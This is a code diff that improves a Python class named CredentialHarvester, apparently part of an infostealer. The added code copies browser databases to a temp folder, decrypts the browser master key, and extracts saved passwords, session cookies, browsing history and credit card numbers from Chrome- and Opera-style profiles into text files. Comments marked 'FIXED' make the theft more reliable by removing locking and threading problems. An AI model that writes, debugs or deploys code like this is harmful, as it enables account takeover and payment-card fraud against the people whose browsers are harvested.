@@ -214,7 +214,6 @@ class CredentialHarvester:
             import io
             import time
             import random
-            import threading
             from typing import Union
             from win32crypt import CryptUnprotectData
 
@@ -257,40 +256,53 @@ class CredentialHarvester:
                     self.temp_path = os.path.expanduser("~/tmp")
                     if not os.path.exists(self.temp_path):
                         os.makedirs(self.temp_path)
+                    # Create Browser subdirectory for cookie storage
+                    self.browser_output_dir = os.path.join(self.temp_path, "Browser")
+                    if not os.path.exists(self.browser_output_dir):
+                        os.makedirs(self.browser_output_dir)
                     print("Starting browser data collection...")
 
-                    def process_browser(name, path, profile, func):
-                        try:
-                            print(f"Processing {{name}} {{profile}} with {{func.__name__}}")
-                            func(name, path, profile)
-                        except Exception as e:
-                            print(f"Error processing {{name}} {{profile}} {{func.__name__}}: {{e}}")
-
-                    threads = []
+                    # FIXED: Process sequentially instead of with threads to avoid:
+                    # 1. Database locking issues (can't read files while browser has them open)
+                    # 2. Race conditions when accessing shared data structures
+                    # 3. Lambda closure issues with loop variables
+                    
                     for name, path in self.browsers.items():
                         if not os.path.isdir(path):
                             print(f"Browser path not found: {{path}}")
                             continue
 
                         print(f"Processing browser: {{name}} at {{path}}")
-                        self.masterkey = self.get_master_key(path + '\\Local State')
-                        funcs = [
-                            lambda n, p, pr: self.cookies(n, p, pr),
-                            lambda n, p, pr: self.history(n, p, pr),
-                            lambda n, p, pr: self.passwords(n, p, pr),
-                            lambda n, p, pr: self.credit_cards(n, p, pr)
-                        ]
+                        
+                        # FIXED: Get master key for this browser (may differ per profile in some cases)
+                        master_key = self.get_master_key(path + '\\Local State')
+                        if not master_key:
+                            print(f"Could not get master key for {{name}}")
+                            continue
 
                         for profile in self.profiles:
-                            for func in funcs:
-                                print(f"Starting thread for {{name}} {{profile}} {{func.__name__}}")
-                                thread = threading.Thread(target=process_browser, args=(name, path, profile, func))
-                                thread.start()
-                                threads.append(thread)
+                            # FIXED: Copy database files to temp location before reading to avoid locking
+                            # Process each data type sequentially
+                            try:
+                                self._process_passwords(name, path, profile, master_key)
+                            except Exception as e:
+                                print(f"Error processing passwords for {{name}} {{profile}}: {{e}}")
+                            
+                            try:
+                                self._process_cookies(name, path, profile, master_key)
+                            except Exception as e:
+                                print(f"Error processing cookies for {{name}} {{profile}}: {{e}}")
+                            
+                            try:
+                                self._process_history(name, path, profile)
+                            except Exception as e:
+                                print(f"Error processing history for {{name}} {{profile}}: {{e}}")
+                            
+                            try:
+                                self._process_credit_cards(name, path, profile, master_key)
+                            except Exception as e:
+                                print(f"Error processing credit cards for {{name}} {{profile}}: {{e}}")
 
-                    print(f"Waiting for {{len(threads)}} threads to complete...")
-                    for thread in threads:
-                        thread.join()
                     print(f"Browser data collection complete. Credentials: {{len(self.credentials_data)}}, History: {{len(self.history_data)}}")
 
                 def get_master_key(self, path: str) -> str:
@@ -306,110 +318,188 @@ class CredentialHarvester:
                         pass
 
                 def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
-                    iv = buff[3:15]
-                    payload = buff[15:]
-                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
-                    decrypted_pass = cipher.decrypt(payload)
-                    decrypted_pass = decrypted_pass[:-16].decode()
-                    return decrypted_pass
+                    try:
+                        iv = buff[3:15]
+                        payload = buff[15:]
+                        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                        decrypted_pass = cipher.decrypt(payload)
+                        decrypted_pass = decrypted_pass[:-16].decode()
+                        return decrypted_pass
+                    except Exception:
+                        return ""
 
-                def passwords(self, name: str, path: str, profile: str):
+                def _copy_db_to_temp(self, db_path):
+                    """Copy database file to temp location to avoid locking issues"""
+                    if not os.path.isfile(db_path):
+                        return None
+                    temp_file = self.create_temp()
+                    shutil.copy2(db_path, temp_file)
+                    return temp_file
+
+                def _process_passwords(self, name: str, path: str, profile: str, master_key: bytes):
+                    """Process passwords - FIXED: copy to temp before reading"""
                     if name == 'opera' or name == 'opera-gx':
-                        path += '\\Login Data'
+                        db_path = path + '\\Login Data'
                     else:
-                        path += '\\' + profile + '\\Login Data'
-                    if not os.path.isfile(path):
+                        db_path = path + '\\' + profile + '\\Login Data'
+                    
+                    # Copy to temp to avoid locking
+                    temp_db = self._copy_db_to_temp(db_path)
+                    if not temp_db:
                         return
-                    conn = sqlite3.connect(path)
-                    cursor = conn.cursor()
-                    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
-                    for results in cursor.fetchall():
-                        if not results[0] or not results[1] or not results[2]:
-                            continue
-                        url = results[0]
-                        login = results[1]
-                        password = self.decrypt_password(results[2], self.masterkey)
-                        self.credentials_data.append({{
-                            "browser": name,
-                            "profile": profile,
-                            "url": url,
-                            "username": login,
-                            "password": password
-                        }})
-                    cursor.close()
-                    conn.close()
+                    
+                    try:
+                        conn = sqlite3.connect(temp_db)
+                        cursor = conn.cursor()
+                        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
+                        for results in cursor.fetchall():
+                            if not results[0] or not results[1] or not results[2]:
+                                continue
+                            url = results[0]
+                            login = results[1]
+                            password = self.decrypt_password(results[2], master_key)
+                            self.credentials_data.append({{
+                                "browser": name,
+                                "profile": profile,
+                                "url": url,
+                                "username": login,
+                                "password": password
+                            }})
+                        cursor.close()
+                        conn.close()
+                    finally:
+                        # Clean up temp file
+                        if temp_db and os.path.exists(temp_db):
+                            try:
+                                os.remove(temp_db)
+                            except:
+                                pass
+
+                def _process_cookies(self, name: str, path: str, profile: str, master_key: bytes):
+                    """Process cookies - FIXED: copy to temp before reading"""
+                    if name == 'opera' or name == 'opera-gx':
+                        db_path = path + '\\Network\\Cookies'
+                    else:
+                        db_path = path + '\\' + profile + '\\Network\\Cookies'
+                    
+                    # Copy to temp to avoid locking
+                    temp_db = self._copy_db_to_temp(db_path)
+                    if not temp_db:
+                        return
+                    
+                    try:
+                        conn = sqlite3.connect(temp_db)
+                        cursor = conn.cursor()
+                        cookie_file_path = os.path.join(self.browser_output_dir, "cookies.txt")
+                        with open(cookie_file_path, 'a', encoding="utf-8") as f:
+                            f.write(f"\nBrowser: {{name}}     Profile: {{profile}}\n\n")
+                            for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
+                                host_key, c_name, c_path, encrypted_value, expires_utc = res
+                                value = self.decrypt_password(encrypted_value, master_key)
+                                if host_key and c_name and value != "":
+                                    f.write(f"{{host_key}}\t{{'FALSE' if expires_utc == 0 else 'TRUE'}}\t{{c_path}}\t{{'FALSE' if host_key.startswith('.') else 'TRUE'}}\t{{expires_utc}}\t{{c_name}}\t{{value}}\n")
+                        cursor.close()
+                        conn.close()
+                    finally:
+                        # Clean up temp file
+                        if temp_db and os.path.exists(temp_db):
+                            try:
+                                os.remove(temp_db)
+                            except:
+                                pass
+
+                def _process_history(self, name: str, path: str, profile: str):
+                    """Process history - already had temp file copy, kept that approach"""
+                    if name == 'opera' or name == 'opera-gx':
+                        db_path = path + '\\History'
+                    else:
+                        db_path = path + '\\' + profile + '\\History'
+                    
+                    # Copy to temp to avoid locking
+                    temp_db = self._copy_db_to_temp(db_path)
+                    if not temp_db:
+                        print(f"History file not found: {{db_path}}")
+                        return
+                    
+                    print(f"Processing history for {{name}} profile {{profile}}: {{db_path}}")
+                    try:
+                        conn = sqlite3.connect(temp_db)
+                        cursor = conn.cursor()
+                        results = cursor.execute("SELECT url, visit_count, title, last_visit_time FROM urls").fetchall()
+                        print(f"Found {{len(results)}} history entries for {{name}}")
+                        for res in results:
+                            url, visit_count, title, last_visit_time = res
+                            self.history_data.append({{
+                                "browser": name,
+                                "profile": profile,
+                                "url": url,
+                                "visit_count": visit_count,
+                                "title": title or "",
+                                "last_visit_time": last_visit_time or 0
+                            }})
+                        cursor.close()
+                        conn.close()
+                    finally:
+                        # Clean up temp file
+                        if temp_db and os.path.exists(temp_db):
+                            try:
+                                os.remove(temp_db)
+                            except:
+                                pass
+                    print(f"History collection complete for {{name}}, total entries: {{len(self.history_data)}}")
+
+                def _process_credit_cards(self, name: str, path: str, profile: str, master_key: bytes):
+                    """Process credit cards - FIXED: copy to temp before reading"""
+                    if name in ['opera', 'opera-gx']:
+                        db_path = path + '\\Web Data'
+                    else:
+                        db_path = path + '\\' + profile + '\\Web Data'
+                    
+                    # Copy to temp to avoid locking
+                    temp_db = self._copy_db_to_temp(db_path)
+                    if not temp_db:
+                        return
+                    
+                    try:
+                        conn = sqlite3.connect(temp_db)
+                        cursor = conn.cursor()
+                        cc_file_path = os.path.join(self.browser_output_dir, "cc's.txt")
+                        with open(cc_file_path, 'a', encoding="utf-8") as f:
+                            if os.path.getsize(cc_file_path) == 0:
+                                f.write("Name on Card  |  Expiration Month  |  Expiration Year  |  Card Number  |  Date Modified\n\n")
+                            for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
+                                name_on_card, expiration_month, expiration_year, card_number_encrypted = res
+                                card_number = self.decrypt_password(card_number_encrypted, master_key)
+                                f.write(f"{{name_on_card}}  |  {{expiration_month}}  |  {{expiration_year}}  |  {{card_number}}\n")
+                        cursor.close()
+                        conn.close()
+                    finally:
+                        # Clean up temp file
+                        if temp_db and os.path.exists(temp_db):
+                            try:
+                                os.remove(temp_db)
+                            except:
+                                pass
+
+                # Keep old method names for compatibility but they now call the fixed versions
+                def passwords(self, name: str, path: str, profile: str):
+                    # This is called by the old code path - just get master key and process
+                    master_key = self.get_master_key(path + '\\Local State')
+                    if master_key:
+                        self._process_passwords(name, path, profile, master_key)
 
                 def cookies(self, name: str, path: str, profile: str):
-                    if name == 'opera' or name == 'opera-gx':
-                        path += '\\Network\\Cookies'
-                    else:
-                        path += '\\' + profile + '\\Network\\Cookies'
-                    if not os.path.isfile(path):
-                        return
-                    cookievault = self.create_temp()
-                    shutil.copy2(path, cookievault)
-                    conn = sqlite3.connect(cookievault)
-                    cursor = conn.cursor()
-                    with open(os.path.join(self.temp_path, "Browser", "cookies.txt"), 'a', encoding="utf-8") as f:
-                        f.write(f"\nBrowser: {{name}}     Profile: {{profile}}\n\n")
-                        for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
-                            host_key, name, path, encrypted_value, expires_utc = res
-                            value = self.decrypt_password(encrypted_value, self.masterkey)
-                            if host_key and name and value != "":
-                                f.write(f"{{host_key}}\t{{'FALSE' if expires_utc == 0 else 'TRUE'}}\t{{path}}\t{{'FALSE' if host_key.startswith('.') else 'TRUE'}}\t{{expires_utc}}\t{{name}}\t{{value}}\n")
-                    cursor.close()
-                    conn.close()
-                    os.remove(cookievault)
+                    master_key = self.get_master_key(path + '\\Local State')
+                    if master_key:
+                        self._process_cookies(name, path, profile, master_key)
 
                 def history(self, name: str, path: str, profile: str):
-                    if name == 'opera' or name == 'opera-gx':
-                        path += '\\History'
-                    else:
-                        path += '\\' + profile + '\\History'
-                    if not os.path.isfile(path):
-                        print(f"History file not found: {{path}}")
-                        return
-                    print(f"Processing history for {{name}} profile {{profile}}: {{path}}")
-                    history_vault = self.create_temp()
-                    shutil.copy2(path, history_vault)
-                    conn = sqlite3.connect(history_vault)
-                    cursor = conn.cursor()
-                    results = cursor.execute("SELECT url, visit_count, title, last_visit_time FROM urls").fetchall()
-                    print(f"Found {{len(results)}} history entries for {{name}}")
-                    for res in results:
-                        url, visit_count, title, last_visit_time = res
-                        self.history_data.append({{
-                            "browser": name,
-                            "profile": profile,
-                            "url": url,
-                            "visit_count": visit_count,
-                            "title": title or "",
-                            "last_visit_time": last_visit_time or 0
-                        }})
-                    cursor.close()
-                    conn.close()
-                    os.remove(history_vault)
-                    print(f"History collection complete for {{name}}, total entries: {{len(self.history)}}")
+                    self._process_history(name, path, profile)
 
                 def credit_cards(self, name: str, path: str, profile: str):
-                    if name in ['opera', 'opera-gx']:
-                        path += '\\Web Data'
-                    else:
-                        path += '\\' + profile + '\\Web Data'
-                    if not os.path.isfile(path):
-                        return
-                    conn = sqlite3.connect(path)
-                    cursor = conn.cursor()
-                    cc_file_path = os.path.join(self.temp_path, "Browser", "cc's.txt")
-                    with open(cc_file_path, 'a', encoding="utf-8") as f:
-                        if os.path.getsize(cc_file_path) == 0:
-                            f.write("Name on Card  |  Expiration Month  |  Expiration Year  |  Card Number  |  Date Modified\n\n")
-                        for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
-                            name_on_card, expiration_month, expiration_year, card_number_encrypted = res
-                            card_number = self.decrypt_password(card_number_encrypted, self.masterkey)
-                            f.write(f"{{name_on_card}}  |  {{expiration_month}}  |  {{expiration_year}}  |  {{card_number}}\n")
-                    cursor.close()
-                    conn.close()
+                    master_key = self.get_master_key(path + '\\Local State')
+                    if master_key:
+                        self._process_credit_cards(name, path, profile, master_key)
 
                 def create_zip_and_send(self):
                     # No longer needed - data is collected directly into self.credentials and self.history
